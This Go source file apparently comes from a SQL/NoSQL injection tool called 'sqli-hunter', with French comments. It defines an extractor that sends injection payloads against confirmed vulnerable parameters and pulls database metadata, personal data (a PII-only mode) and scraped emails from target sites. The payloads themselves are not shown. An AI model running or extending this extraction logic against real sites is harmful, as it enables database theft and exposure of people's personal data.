package extractor

import (
	"context"
	"fmt"
	"sync"

	"github.com/sqli-hunter/sqli-hunter/internal/client"
	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

// Extractor tente d'extraire des données DB via une injection confirmée.
type Extractor struct {
	httpClient *client.HTTPClient
	onExtract  func(models.ExtractedData)
	onDumpFail func(models.Finding, string)
	onProgress func(string)
	rateLimit  func()
	piiOnly    bool
}

// SetOnDumpFail enregistre un callback quand l'extraction PII échoue.
func (e *Extractor) SetOnDumpFail(fn func(models.Finding, string)) {
	e.onDumpFail = fn
}

// New crée un extracteur.
func New(httpClient *client.HTTPClient, onExtract func(models.ExtractedData), onProgress func(string), rateLimit func(), piiOnly bool) *Extractor {
	return &Extractor{
		httpClient: httpClient,
		onExtract:  onExtract,
		onProgress: onProgress,
		rateLimit:  rateLimit,
		piiOnly:    piiOnly,
	}
}

// ExtractFromFinding extrait des données à partir d'une vulnérabilité détectée.
func (e *Extractor) ExtractFromFinding(ctx context.Context, target models.ScanTarget, finding models.Finding) []models.ExtractedData {
	scraped := e.scrapeEmailsFromFinding(ctx, target, finding)
	pii := e.runPIIFromFinding(ctx, target, finding)
	if len(pii) == 0 {
		return scraped
	}
	return append(scraped, pii...)
}

// ExtractDirect lance l'extraction sans scan préalable (mode --extract).
func (e *Extractor) ExtractDirect(ctx context.Context, target models.ScanTarget) models.ExtractionResult {
	result := models.ExtractionResult{Target: target}

	params := collectParams(target)
	if len(params) == 0 {
		result.Errors = append(result.Errors, "aucun paramètre")
		return result
	}

	// Tenter extraction sur chaque param avec toutes les techniques SQLi + NoSQL
	for _, param := range params {
		for _, vt := range []models.VulnType{models.SQLiUnion, models.SQLiError, models.NoSQL} {
			if ctx.Err() != nil {
				return result
			}
			data := e.run(ctx, target, param, vt, "", target.URL)
			result.Extractions = append(result.Extractions, data...)
		}
	}

	return result
}

// ExtractAll extrait sur toutes les findings d'un scan.
func (e *Extractor) ExtractAll(ctx context.Context, target models.ScanTarget, findings []models.Finding) models.ExtractionResult {
	result := models.ExtractionResult{Target: target}
	seen := make(map[string]bool)

	for _, f := range findings {
		if ctx.Err() != nil {
			break
		}
		key := f.Parameter + "|" + string(f.VulnType)
		if seen[key] {
			continue
		}
		seen[key] = true

		data := e.ExtractFromFinding(ctx, target, f)
		result.Extractions = append(result.Extractions, data...)
	}

	return result
}

func (e *Extractor) run(ctx context.Context, target models.ScanTarget, param string, vulnType models.VulnType, dbms, findingURL string) []models.ExtractedData {
	finding := models.Finding{URL: findingURL, Parameter: param, VulnType: vulnType, DBMS: dbms}
	if e.piiOnly {
		return e.runPIIFromFinding(ctx, target, finding)
	}
	return e.runMetadata(ctx, target, param, vulnType, dbms, findingURL)
}

func (e *Extractor) runMetadata(ctx context.Context, target models.ScanTarget, param string, vulnType models.VulnType, dbms, findingURL string) []models.ExtractedData {
	jobs := BuildJobs(dbms, vulnType)
	var results []models.ExtractedData
	foundTypes := make(map[models.DataType]bool)

	var mu sync.Mutex
	for _, job := range jobs {
		if ctx.Err() != nil {
			break
		}
		if foundTypes[job.DataType] {
			continue // une extraction par type suffit
		}

		if e.rateLimit != nil {
			e.rateLimit()
		}
		if e.onProgress != nil {
			e.onProgress(fmt.Sprintf("[extract:%s] %s → %s", param, job.DataType, truncPayload(job.Payload, 60)))
		}

		resp, err := e.httpClient.Send(ctx, target, param, job.Payload)
		if err != nil {
			continue
		}

		value, ok := ParseResponse(resp.Body, job.Payload, job.Method, job.DataType)
		if !ok || value == "" {
			continue
		}

		data := models.ExtractedData{
			FindingURL: findingURL,
			Parameter:  param,
			VulnType:   vulnType,
			DBMS:       dbms,
			DataType:   job.DataType,
			Value:      value,
			Payload:    job.Payload,
			Method:     job.Method,
		}

		mu.Lock()
		foundTypes[job.DataType] = true
		results = append(results, data)
		mu.Unlock()

		if e.onExtract != nil {
			e.onExtract(data)
		}
	}

	return results
}

func collectParams(target models.ScanTarget) []string {
	seen := make(map[string]bool)
	var names []string
	for k := range target.Params {
		if !seen[k] {
			seen[k] = true
			names = append(names, k)
		}
	}
	for k := range target.Data {
		if !seen[k] {
			seen[k] = true
			names = append(names, k)
		}
	}
	return names
}

func truncPayload(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
